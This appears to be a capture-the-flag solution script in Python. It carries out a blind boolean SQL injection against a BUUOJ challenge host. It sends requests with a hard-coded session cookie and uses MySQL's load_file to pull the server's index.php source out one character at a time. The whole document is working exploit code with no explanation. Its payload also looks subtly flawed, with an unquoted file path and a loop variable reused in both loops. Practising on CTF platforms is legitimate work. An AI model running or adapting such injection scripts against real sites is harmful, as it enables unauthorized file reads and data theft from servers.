import requests
cookies = {
    "PHPSESSID":"ng4nm4ovigsf7e3tjl2s9i8sq5"
}
data='0x'
flag=''
r=requests.session()
for i in range(9999):
    for i in range(1,127):
        #print (i)
        url='http://30c80ea0-a00f-4d5e-9a0c-3ba7e5d2cc87.node4.buuoj.cn:81/user/user.php?id=0^(load_file(/var/www/html/user/index.php)<'+str(i)+')'
        result=r.get(url=url,cookies=cookies).text
        if 'admin' in result:
            data+=str(hex(i-1)).replace('0x','')
            flag+=(chr(i-1))
            print (flag)
            break
print(data)
